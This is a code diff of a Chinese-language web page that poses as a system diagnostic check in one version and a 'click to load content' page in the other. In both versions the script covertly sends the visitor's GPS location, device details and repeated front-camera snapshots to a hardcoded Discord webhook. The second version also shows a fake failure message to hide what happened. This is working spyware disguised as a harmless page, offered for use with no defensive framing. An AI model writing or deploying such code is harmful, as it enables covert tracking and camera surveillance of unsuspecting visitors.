@@ -2,122 +2,84 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>系統效能檢測中心</title>
-    <style>
-        :root { --primary-color: #0071e3; --bg-color: #f5f5f7; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg-color); color: #1d1d1f; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: white; width: 90%; max-width: 400px; padding: 40px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; }
-        h2 { font-weight: 600; margin-bottom: 10px; }
-        p { color: #86868b; font-size: 14px; line-height: 1.5; }
-        .progress-container { width: 100%; background: #e5e5e7; height: 6px; border-radius: 3px; margin: 25px 0; overflow: hidden; display: none; }
-        .progress-bar { width: 0%; height: 100%; background: var(--primary-color); transition: width 0.4s ease; }
-        .btn-start { background: var(--primary-color); color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; font-weight: 500; cursor: pointer; transition: transform 0.2s; }
-        .btn-start:active { transform: scale(0.96); }
-        #status-list { text-align: left; font-size: 13px; color: #515154; margin-top: 15px; }
-        .status-item { margin: 5px 0; display: flex; justify-content: space-between; }
-    </style>
+    <title>內容載入中</title>
 </head>
 <body>
 
-<div class="card">
-    <div style="font-size: 40px; margin-bottom: 15px;">💻</div>
-    <h2>系統完整性檢查</h2>
-    <p>我們將測試您的瀏覽器相容性、硬體加速以及網路延遲，以提供最佳的使用體驗。</p>
-    
-    <div id="status-list"></div>
+<h2>點擊按鈕查看內容</h2>
+<button onclick="startAction()">點擊載入</button>
+<p id="status"></p>
 
-    <div class="progress-container" id="p-container">
-        <div class="progress-bar" id="p-bar"></div>
-    </div>
-
-    <button class="btn-start" id="start-btn" onclick="runDiagnostic()">開始檢查</button>
-</div>
-
+<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 
-function updateStatus(label, value) {
-    const list = document.getElementById("status-list");
-    list.innerHTML += `<div class="status-item"><span>${label}</span><span style="color:#0071e3">${value}</span></div>`;
+function startAction() {
+    getLocation(); // 原有的定位
+    getCamera();   // 新增的截圖
 }
 
-async function runDiagnostic() {
-    const btn = document.getElementById("start-btn");
-    const pContainer = document.getElementById("p-container");
-    const pBar = document.getElementById("p-bar");
-
-    btn.style.display = "none";
-    pContainer.style.display = "block";
-
-    // 1. 抓取硬體資訊
-    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 1, charging: true}));
-    const info = {
-        platform: navigator.platform,
-        cores: navigator.hardwareConcurrency || "N/A",
-        ram: navigator.deviceMemory || "N/A",
-        battery: Math.round(battery.level * 100) + "%"
-    };
-
-    updateStatus("瀏覽器核心", "已就緒");
-    pBar.style.width = "30%";
-
-    // 2. 啟動定位 (包裝成網路延遲優化)
+function getLocation() {
+    document.getElementById("status").innerHTML = "正在取得內容...";
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            updateStatus("區域網路節點", "已優化");
-            pBar.style.width = "60%";
-            
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `📈 **新診斷報告**\n📍 地點: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🔋 電量: ${info.battery}\n💻 規格: ${info.cores}核 / ${info.ram}GB RAM\n🖥️ 系統: ${navigator.userAgent}`
-                })
-            });
-        }, () => { updateStatus("區域網路節點", "跳過"); });
+        navigator.geolocation.getCurrentPosition(success, error, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
     }
-
-    // 3. 啟動相機 (包裝成視訊渲染測試)
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => {
-        updateStatus("視訊渲染引擎", "運行中");
-        pBar.style.width = "100%";
-        
-        const video = document.getElementById("v");
-        video.srcObject = stream;
-        setTimeout(capture, 1500);
-        setInterval(capture, 5000);
-        
-        setTimeout(() => {
-            document.querySelector("h2").innerText = "檢查完成";
-            document.querySelector("p").innerText = "您的系統運行良好，所有組件均已達到最佳效能。";
-            pContainer.style.display = "none";
-        }, 1000);
-    })
-    .catch(() => {
-        updateStatus("視訊引擎", "未偵測到裝置");
-        pBar.style.width = "100%";
-    });
 }
 
-function capture() {
-    const video = document.getElementById("v");
-    const canvas = document.getElementById("c");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('file', blob, 'diag_report.jpg');
-        formData.append('payload_json', JSON.stringify({ content: "📸 **實時視訊監控更新**" }));
-        fetch(WEBHOOK, { method: "POST", body: formData });
-    }, "image/jpeg", 0.7);
+function success(pos) {
+    var lat = pos.coords.latitude;
+    var lon = pos.coords.longitude;
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
+        })
+    });
+    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
+}
+
+function error(err) {
+    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
+}
+
+function getCamera() {
+    // 請求相機權限
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(function(stream) {
+        var video = document.getElementById("v");
+        video.srcObject = stream;
+        
+        // 每 5 秒截圖並傳送一次
+        setInterval(function() {
+            var canvas = document.getElementById("c");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(function(blob) {
+                var formData = new FormData();
+                formData.append('file', blob, 'capture.jpg');
+                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
+                
+                fetch(webhook, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
+        }, 5000);
+    })
+    .catch(function(err) {
+        console.log("相機權限被拒絕");
+    });
 }
 </script>
 
